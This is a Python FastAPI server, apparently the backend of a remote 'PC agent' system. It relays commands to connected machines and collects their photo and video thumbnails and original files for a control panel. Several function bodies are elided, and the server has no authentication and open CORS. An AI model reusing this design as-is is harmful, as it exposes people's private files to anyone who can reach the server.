import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Agente PC - Backend")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA PARA EL PC ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Any]] = {} # Guardará miniaturas y originales
fetch_status: Dict[str, str] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str
    small_thumb_b64: str

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

# --- ENDPOINTS ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    # ... (Esta función es idéntica a la que ya tienes) ...
    # ... (Maneja la conexión del agente de PC) ...

@app.get("/api/get-agents")
async def get_agents():
    # ... (Esta función es idéntica) ...
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    # ... (Esta función es idéntica) ...
    # ... (Limpia la caché y reenvía la orden al agente de PC) ...

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    # ... (Esta función es idéntica) ...
    # ... (Recibe los lotes de miniaturas del PC) ...

# --- ¡NUEVA LÓGICA DIRECTA PARA EL PC! ---
@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    decoded_filename = unquote(filename)
    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
        return Response(content="Archivo no solicitado", status_code=400)
    
    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
    
    print(f"Recibido archivo original '{decoded_filename}' de {device_id[:8]}.")
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    # ... (Esta función es idéntica) ...
    # ... (Devuelve el estado y las miniaturas al panel) ...

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    decoded_filename = unquote(filename)
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(decoded_filename)
    
    if not media_item or 'original_b64' not in media_item:
        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404)
    
    try:
        file_bytes = base64.b64decode(media_item['original_b64'])
        # --- LÓGICA DE TIPO DE ARCHIVO MEJORADA ---
        media_type = "application/octet-stream"
        if decoded_filename.lower().endswith(('.jpg', '.jpeg')): media_type = "image/jpeg"
        elif decoded_filename.lower().endswith('.png'): media_type = "image/png"
        elif decoded_filename.lower().endswith('.mp4'): media_type = "video/mp4"
        return Response(content=file_bytes, media_type=media_type)
    except Exception as e:
        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)

# El resto de las funciones idénticas van aquí...